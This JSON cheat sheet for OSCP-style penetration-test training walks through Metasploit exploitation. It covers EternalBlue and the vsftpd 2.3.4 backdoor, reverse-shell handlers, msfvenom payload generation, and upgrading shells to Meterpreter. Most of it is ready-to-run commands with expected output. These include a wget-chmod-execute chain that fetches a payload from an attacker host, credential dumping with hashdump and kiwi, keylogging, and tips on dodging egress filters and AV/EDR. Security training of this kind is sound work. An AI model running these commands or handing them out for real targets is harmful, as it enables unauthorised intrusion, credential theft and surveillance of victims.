{
  "cheatsheets": [
    {
      "id": "metasploit-exploitation",
      "name": "Metasploit Exploitation - Payload Delivery & Session Management",
      "description": "End-to-end exploitation workflow using Metasploit exploit modules, payload selection, handler setup, and session management for gaining and maintaining access on OSCP targets",
      "educational_header": {
        "how_to_recognize": [
          "Service version matches known CVE with Metasploit exploit module available",
          "Auxiliary scan confirmed vulnerability (MS17-010, Shellshock, etc.)",
          "Need to deliver payload to compromised service for shell access",
          "Requirement to catch multiple reverse shells from different targets",
          "Existing shell needs upgrade to Meterpreter for advanced features",
          "Multiple active sessions requiring organized management"
        ],
        "when_to_look_for": [
          "After enumeration confirms exploitable service version (e.g., SMB 1.0, vsftpd 2.3.4)",
          "When searchsploit shows Metasploit module for discovered vulnerability",
          "Before manual exploitation attempts (try Metasploit first for speed)",
          "When you need reliable payload delivery and session management",
          "For multi-target exploitation (background handlers, multiple sessions)",
          "When post-exploitation framework is needed (Meterpreter > basic shell)"
        ]
      },
      "scenarios": [
        {
          "title": "Scenario 1: Basic Exploitation Workflow - SMB MS17-010 (EternalBlue)",
          "context": "Target: Windows Server 2008 R2 (192.168.45.100), SMB port 445 open. Auxiliary scan confirmed vulnerable to MS17-010. Goal: Exploit EternalBlue to gain SYSTEM shell.",
          "approach": "Step 1: Confirm vulnerability: use auxiliary/scanner/smb/smb_ms17_010; set RHOSTS 192.168.45.100; run (should show 'Host is VULNERABLE'). Step 2: Select exploit module: use exploit/windows/smb/ms17_010_eternalblue. Step 3: View required options: show options (note RHOSTS required). Step 4: View compatible payloads: show payloads (list shows 40+ Windows payloads). Step 5: Select payload: set payload windows/x64/meterpreter/reverse_tcp. Step 6: Configure payload: set LHOST 192.168.45.5; set LPORT 4444. Step 7: Set target: set RHOSTS 192.168.45.100. Step 8: Check configuration: show options (verify all required fields set). Step 9: Optionally check target: check (verifies vulnerability without exploiting). Step 10: Exploit: exploit (or run).",
          "commands": [
            "msf-aux-smb-ms17010",
            "msf-use-module",
            "msf-show-options",
            "msf-show-payloads",
            "msf-set-payload",
            "msf-set-lhost",
            "msf-set-lport",
            "msf-exploit-check",
            "msf-exploit-run"
          ],
          "expected_outcome": "check command shows: '[+] 192.168.45.100:445 - The target is vulnerable'. exploit shows: '[*] Started reverse TCP handler on 192.168.45.5:4444, [*] Sending stage (200774 bytes), [*] Meterpreter session 1 opened'. Prompt changes to 'meterpreter >' with SYSTEM privileges. Time: 30-90 seconds from module selection to shell. Failure indicators: 'Exploit completed, but no session was created' (payload mismatch or firewall), 'Exploit failed: Rex::ConnectionTimeout' (target offline or firewall blocking). Next steps: getuid (verify SYSTEM), sysinfo (OS details), hashdump (extract credentials). Common issues: Wrong architecture (x86 vs x64), Firewall blocking reverse connection, Service already patched.",
          "why_this_works": "MS17-010 (CVE-2017-0144) exploits: SMBv1 buffer overflow in srv.sys driver, Allows remote code execution without authentication, Targets Windows Vista to Server 2008 R2 (pre-patch). Exploit steps: 1) Send specially crafted SMB packets to trigger buffer overflow, 2) Overwrite kernel memory to gain SYSTEM privileges, 3) Execute staged payload (Meterpreter) in privileged context, 4) Meterpreter payload connects back to handler. Payload staging: 'windows/x64/meterpreter/reverse_tcp' is staged (small initial shellcode), '/' separates stager (reverse_tcp) from stage (meterpreter/x64), Staged payloads smaller (bypass size restrictions) but require handler. Handler setup: exploit command starts multi/handler automatically, Handler listens on LHOST:LPORT for stage 2 connection, Sends full Meterpreter DLL after stage 1 connects. Why Meterpreter: Runs in memory (no disk artifacts), Provides advanced post-exploitation (hashdump, screenshot, keylog), Enables pivoting (route, portfwd). OSCP notes: EternalBlue highly reliable (rank: excellent), Works on unpatched Windows 7/Server 2008 R2 (common in labs), Firewall often blocks 4444 (use ports 80, 443, 53 for egress). Troubleshooting: If exploit hangs, try different target: show targets; set target 1. If no session, try non-staged payload: set payload windows/x64/meterpreter_reverse_tcp."
        },
        {
          "title": "Scenario 2: Multi-Target Exploitation with Background Handlers",
          "context": "3 Windows targets (192.168.45.100-102) vulnerable to different exploits. Need to exploit all while maintaining organized session management. Goal: Run multiple handlers in background, catch all shells, switch between sessions.",
          "approach": "Step 1: Set up first handler in background: use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST 192.168.45.5; set LPORT 4444; set ExitOnSession false; exploit -j -z (runs as background job). Step 2: Set up second handler on different port: set LPORT 4445; exploit -j -z. Step 3: Verify handlers running: jobs (shows background jobs). Step 4: Exploit first target (manually or via separate exploit module): delivers payload to port 4444. Step 5: Exploit second target with different payload: delivers to port 4445. Step 6: Check sessions: sessions -l (shows all active sessions). Step 7: Interact with specific session: sessions -i 1. Step 8: Background current session: background (or Ctrl+Z). Step 9: Switch to different session: sessions -i 2.",
          "commands": [
            "msf-handler-background",
            "msf-handler-exitonsession",
            "msf-jobs-list",
            "msf-sessions-list",
            "msf-session-interact",
            "msf-session-background"
          ],
          "expected_outcome": "exploit -j -z shows: '[*] Exploit running as background job 0', '[*] Started reverse TCP handler on 192.168.45.5:4444'. jobs command lists: 'Id 0: Exploit: multi/handler Payload: windows/meterpreter/reverse_tcp'. When payloads connect: '[*] Sending stage (200774 bytes), [*] Meterpreter session 1 opened'. sessions -l shows: 'Id 1: 192.168.45.100:49234 -> 192.168.45.5:4444 (NT AUTHORITY\\SYSTEM) meterpreter x64/windows'. Time: 1-2 minutes to set up handlers, instant session switching. ExitOnSession false critical: allows single handler to catch multiple connections. Without it: Handler stops after first session, subsequent exploits fail. Background jobs enable: Continue working while handlers listen, Run multiple handlers simultaneously, Organize multi-target operations.",
          "why_this_works": "Background handlers using multi/handler: Universal listener for all payload types (staged/non-staged), Can receive connections from any exploit (not tied to specific CVE), Runs as background job (doesn't block msfconsole prompt). Flag explanations: exploit -j (run as job, returns job ID), exploit -z (don't auto-interact with session, stays backgrounded), ExitOnSession false (handler continues after first session, critical for multi-target). Session management architecture: Each session = independent command channel to compromised host, Sessions persist until explicitly killed or target reboots, Can run commands on specific session without interacting: sessions -c 'sysinfo' -i 1. Workflow for multiple targets: 1) Set up background handlers on different ports (4444, 4445, 4446), 2) Generate payloads for each port: msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444, 3) Deliver payloads via web upload, email, SMB, etc., 4) Handlers catch connections as payloads execute, 5) Manage sessions with sessions command. OSCP exam scenario: 3 Windows boxes + 1 Linux box = 4 background handlers (3x Windows payloads, 1x Linux payload), Separate handler per port prevents confusion, Use descriptive ports: 4444 (web-01), 4445 (dc-01), 4446 (file-server). Advantages: No manual nc listeners (Meterpreter > basic shell), Centralized session management (sessions -l shows all), Database integration (sessions recorded in database). Troubleshooting: Handler not catching connection: Verify payload matches handler (staged vs non-staged), Check LHOST/LPORT in payload matches handler settings. Too many sessions: Use sessions -k <ID> to kill dead sessions, sessions -K to kill all (dangerous)."
        },
        {
          "title": "Scenario 3: Payload Selection and Troubleshooting",
          "context": "Exploit module loaded (vsftpd 2.3.4 backdoor), target is Linux. Need to select appropriate payload, but exploit keeps failing. Goal: Understand payload compatibility, try alternatives, achieve successful exploitation.",
          "approach": "Step 1: Load exploit: use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS 192.168.45.100. Step 2: View compatible payloads: show payloads (shows cmd/unix/interact only). Step 3: Check default payload: show options (payload already set to cmd/unix/interact). Step 4: Try exploit: exploit (fails with 'no session created'). Step 5: Review exploit info: info (check 'Targets', 'Reliable', 'Disclosure Date'). Step 6: Check if target requires specific version: show targets; set target 0 (automatic). Step 7: Try manual target selection: set target 1. Step 8: If still failing, verify vulnerability: use auxiliary/scanner/ftp/ftp_version; set RHOSTS 192.168.45.100; run (confirms version 2.3.4). Step 9: Try alternative exploit or manual exploitation. Step 10: If exploit succeeds, verify shell: background; sessions -l (shows cmd/unix session, not Meterpreter).",
          "commands": [
            "msf-use-module",
            "msf-show-payloads",
            "msf-show-options",
            "msf-exploit-run",
            "msf-info-module",
            "msf-show-targets",
            "msf-set-target"
          ],
          "expected_outcome": "show payloads for vsftpd backdoor shows only 'cmd/unix/interact' (command shell, not Meterpreter - this exploit doesn't support Meterpreter). exploit success shows: '[*] 192.168.45.100:6200 - Banner: 220 (vsFTPd 2.3.4), [*] Command shell session 1 opened'. Note: session type is 'shell', not 'meterpreter'. sessions -l shows 'cmd/unix' type. Upgrade to Meterpreter: sessions -u 1 (attempts to upgrade shell to Meterpreter). Upgrade may fail on some shells (platform limitations). Time: 10-30 seconds for successful exploit. Common failures: Wrong payload type (trying Meterpreter on cmd-only exploit), Target OS mismatch (Windows payload on Linux target), Exploit reliability issues (some exploits rank 'manual' or 'low'). Troubleshooting steps: Check module rank: info (look for 'Rank: Excellent' vs 'Rank: Low'), Verify payload compatibility: show payloads (only shows compatible payloads), Try manual exploitation if module fails: nc 192.168.45.100 21; USER user:); PASS pass.",
          "why_this_works": "Payload compatibility determined by: Target operating system (Windows/Linux/macOS/BSD), Target architecture (x86, x64, ARM, MIPS), Exploit module constraints (some exploits only support specific payload types), Shell type (command shell vs Meterpreter vs VNC). cmd/unix/interact payload: Spawns /bin/sh shell on Linux/Unix targets, No staging (single-stage payload), Minimal functionality (no Meterpreter features), Used by exploits with tight space constraints. Payload naming convention: <platform>/<arch>/<type>/<handler>, Example: windows/x64/meterpreter/reverse_tcp, platform=windows, arch=x64, type=meterpreter, handler=reverse_tcp. Staged vs non-staged: Staged (/) = multi-stage (small initial payload + full stage), Non-staged (_) = single payload (larger, self-contained), Example: windows/meterpreter/reverse_tcp (staged) vs windows/meterpreter_reverse_tcp (non-staged). When to use non-staged: Target environment blocks staged delivery, Time constraints (non-staged connects faster), Firewall rules (some firewalls detect multi-stage as malicious). Module reliability ranks: Excellent = always works, never crashes service, Great = usually works, rarely crashes, Good = sometimes crashes service, Normal = often unstable, Average/Low/Manual = unreliable, requires tweaking. OSCP strategy: Prefer rank:excellent|great modules, Try multiple payloads if first fails (staged \u2192 non-staged \u2192 cmd shell), Use sessions -u to upgrade cmd shell to Meterpreter post-exploit, Fallback to manual exploitation if Metasploit module unreliable. vsftpd 2.3.4 backdoor explanation: Malicious version released in 2011 (intentional backdoor), Triggers on username ending with ':)' (smiley face), Opens root shell on port 6200, Exploit success rate: 100% if correct version, Common in CTFs and OSCP-style labs."
        },
        {
          "title": "Scenario 4: Session Upgrade and Management",
          "context": "Exploited web application, received basic netcat shell (non-Metasploit). Need Meterpreter features (hashdump, route, portfwd) but current shell is basic command shell. Goal: Upgrade to Meterpreter session within Metasploit framework.",
          "approach": "Step 1: From netcat shell, note target IP and your listener IP. Step 2: In Metasploit, set up handler to catch upgrade: use exploit/multi/handler; set payload linux/x64/meterpreter/reverse_tcp; set LHOST 192.168.45.5; set LPORT 4444; exploit -j. Step 3: From netcat shell, upload Meterpreter payload: wget http://192.168.45.5:8000/meterpreter.elf; chmod +x meterpreter.elf; ./meterpreter.elf. Step 4: Handler catches Meterpreter connection: '[*] Meterpreter session 1 opened'. Step 5: Verify upgrade: sessions -l (shows meterpreter x64/linux). Step 6: Interact with Meterpreter: sessions -i 1. Step 7: Alternative method - upgrade existing Metasploit shell session: sessions -u <SESSION_ID> (automated upgrade). Step 8: Manage multiple sessions: sessions -l; sessions -i <ID> to switch.",
          "commands": [
            "msf-handler-setup",
            "msf-session-upgrade-shell",
            "msf-sessions-list",
            "msf-session-interact",
            "msf-session-kill"
          ],
          "expected_outcome": "Manual upgrade via payload upload: wget downloads Meterpreter binary, execution connects back to handler on port 4444, sessions -l shows new Meterpreter session. Automated sessions -u upgrade: '[*] Upgrading session ID: 1, [*] Starting exploit/multi/handler, [*] Meterpreter session 2 opened'. Original shell (session 1) remains active, new Meterpreter session created (session 2). Upgrade success indicators: sessions -l shows type='meterpreter' not 'shell', meterpreter> prompt appears, commands like sysinfo, getuid work. Upgrade failure reasons: Platform incompatible (wrong architecture), Target lacks dependencies (/tmp not writable), AV/EDR detects Meterpreter upload. Time: 1-2 minutes for manual upgrade, 10-30 seconds for sessions -u. Post-upgrade capabilities: File operations (download, upload, cat, search), Privilege escalation (getsystem), Credential dumping (hashdump, kiwi), Pivoting (route add, portfwd), Surveillance (screenshot, keyscan_start). Session cleanup: Kill dead sessions: sessions -k 1, Kill all sessions: sessions -K (dangerous - confirms twice), View session details: sessions -v (verbose info).",
          "why_this_works": "Shell upgrade necessity: Basic shells (nc, /bin/sh) lack Metasploit integration, No built-in file transfer (must use wget/curl manually), No credential dumping or privilege escalation helpers, No pivoting infrastructure (manual iptables/SSH tunneling required). Meterpreter advantages: In-memory execution (no disk writes), Encrypted C2 channel (harder to detect), Modular architecture (load features on demand: load kiwi, load python), Cross-platform consistency (same commands on Windows/Linux). sessions -u upgrade mechanism: 1) Detects session platform (Windows/Linux/macOS), 2) Selects appropriate Meterpreter payload, 3) Sets up background handler on new port, 4) Uploads Meterpreter payload via existing shell, 5) Executes payload, catches connection on handler, 6) Creates new Meterpreter session, preserves original shell. Manual upgrade process: Generate Meterpreter binary: msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f elf -o meterpreter.elf, Host with HTTP server: python3 -m http.server 8000, Download from target: wget http://<ATTACKER_IP>:8000/meterpreter.elf, Execute on target: chmod +x meterpreter.elf && ./meterpreter.elf. Session management best practices: Name sessions for clarity: sessions -n web-server -i 1, Keep original shell alive (backup if Meterpreter dies), Test Meterpreter commands before killing shell: sysinfo, getuid, Background Meterpreter to run multiple sessions: Ctrl+Z or background. OSCP workflow: Initial foothold via any method (nc shell, PHP shell, SQLi RCE), Upgrade to Metasploit session for tooling, Use Meterpreter for enumeration (post modules), Downgrade to manual commands for stability if Meterpreter detected. Limitations: sessions -u doesn't work on Windows cmd.exe shells (use manual method), sessions -u may be blocked by AV/EDR (manual upload bypasses some signatures), Meterpreter heavier than basic shell (more detectable)."
        }
      ],
      "sections": [
        {
          "title": "Phase 1: Exploit Selection and Verification",
          "notes": "After enumeration identifies vulnerable service, search Metasploit for exploit: search <service> <version> or search cve:<year>. Use info to review exploit details (rank, targets, disclosure date). Run check if available (verifies vulnerability without exploiting). Prefer rank:excellent|great modules for OSCP exam stability. Estimated time: 2-3 minutes.",
          "commands": [
            {
              "id": "msf-search-keyword",
              "shows": "See command documentation"
            },
            {
              "id": "msf-search-cve",
              "shows": "See command documentation"
            },
            {
              "id": "msf-use-module",
              "example": "use exploit/multi/handler",
              "shows": "Prompt changes to show module type and path"
            },
            {
              "id": "msf-info-module",
              "example": "info exploit/windows/smb/ms17_010_eternalblue",
              "shows": "Module details displayed (Name, Module, License, Rank, etc)"
            },
            {
              "id": "msf-exploit-check",
              "example": "check",
              "shows": "The target is vulnerable"
            }
          ]
        },
        {
          "title": "Phase 2: Payload Configuration",
          "notes": "View compatible payloads: show payloads. Select based on target OS and architecture (x86 vs x64). Use staged payloads (/) for tight space, non-staged (_) for reliability. Set LHOST to your VPN IP (tun0) or interface name. Use uncommon LPORT (80, 443, 53) to bypass egress filtering. Verify all options set: show options. Estimated time: 1-2 minutes.",
          "commands": [
            {
              "id": "msf-show-payloads",
              "example": "show payloads",
              "shows": "Compatible Payloads list with name, rank, description"
            },
            {
              "id": "msf-set-payload",
              "example": "set payload windows/x64/meterpreter/reverse_tcp",
              "shows": "payload => <path> confirmation"
            },
            {
              "id": "msf-set-lhost",
              "example": "set LHOST 192.168.45.5",
              "shows": "LHOST => <IP> confirmation"
            },
            {
              "id": "msf-set-lport",
              "example": "set LPORT 443",
              "shows": "LPORT => <PORT> confirmation"
            },
            {
              "id": "msf-show-options",
              "example": "show options",
              "shows": "Options table displayed with columns: Name, Current Setti..."
            }
          ]
        },
        {
          "title": "Phase 3: Exploitation Execution",
          "notes": "Set RHOSTS to target IP. Optionally set target if multiple OS versions: show targets; set target <ID>. Run exploit (or exploit -j for background). Monitor for session creation or error messages. Common failures: Payload mismatch (wrong arch), Firewall blocking reverse connection, Service already patched. Troubleshooting: Try different target, change payload, use manual exploitation. Estimated time: 30-90 seconds.",
          "commands": [
            {
              "id": "msf-set-option",
              "example": "set RHOSTS 192.168.45.100",
              "shows": "OPTION => VALUE confirmation message"
            },
            {
              "id": "msf-show-targets",
              "example": "show targets",
              "shows": "Available targets list with ID and name"
            },
            {
              "id": "msf-set-target",
              "example": "set target 1",
              "shows": "target => <ID> confirmation"
            },
            {
              "id": "msf-exploit-run",
              "example": "exploit",
              "shows": "Started reverse TCP handler"
            }
          ]
        },
        {
          "title": "Phase 4: Handler Setup for Multi-Target Operations",
          "notes": "For multiple targets, set up background handlers first: use exploit/multi/handler; set payload <payload>; set LHOST <IP>; set LPORT <PORT>; set ExitOnSession false; exploit -j -z. Create separate handler per port (4444, 4445, etc.). Verify handlers running: jobs. Handlers catch shells as payloads execute on targets. Estimated time: 1 minute per handler.",
          "commands": [
            {
              "id": "msf-handler-setup",
              "example": "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 192.168.45.5; set LPORT 443; run",
              "shows": "Started reverse TCP handler on <LHOST>:<LPORT>"
            },
            {
              "id": "msf-handler-background",
              "example": "use exploit/multi/handler; set payload linux/x64/meterpreter_reverse_tcp; set LHOST 192.168.45.5; set LPORT 443; run -j",
              "shows": "Exploit running as background job <ID>"
            },
            {
              "id": "msf-handler-exitonsession",
              "example": "use exploit/multi/handler; set payload windows/meterpreter_reverse_tcp; set LHOST 192.168.45.5; set LPORT 443; set ExitOnSession false; run -j",
              "shows": "ExitOnSession => false"
            },
            {
              "id": "msf-jobs-list",
              "example": "jobs",
              "shows": "Jobs table with ID, Name, Payload, Payload opts"
            }
          ]
        },
        {
          "title": "Phase 5: Session Management and Upgrade",
          "notes": "View active sessions: sessions -l. Interact with session: sessions -i <ID>. Upgrade basic shell to Meterpreter: sessions -u <ID>. Background session: Ctrl+Z or background. Switch between sessions as needed. Kill dead sessions: sessions -k <ID>. Name sessions for organization: sessions -n <name> -i <ID>. Estimated time: Instant switching, 10-30 seconds for upgrade.",
          "commands": [
            {
              "id": "msf-sessions-list",
              "example": "sessions -l",
              "shows": "Active sessions table with ID, Name, Type, Information, C..."
            },
            {
              "id": "msf-session-interact",
              "example": "sessions -i 1",
              "shows": "Starting interaction with <ID>"
            },
            {
              "id": "msf-session-upgrade-shell",
              "example": "sessions -u 1",
              "shows": "Meterpreter session opened"
            },
            {
              "id": "msf-session-background",
              "example": "background",
              "shows": "Backgrounding session <ID>"
            },
            {
              "id": "msf-session-kill",
              "example": "sessions -k 1",
              "shows": "Session <ID> closed"
            }
          ]
        }
      ],
      "tags": [
        "METASPLOIT",
        "EXPLOITATION",
        "PAYLOAD",
        "HANDLER",
        "SESSION",
        "METERPRETER",
        "OSCP:HIGH",
        "SHELLS"
      ]
    }
  ]
}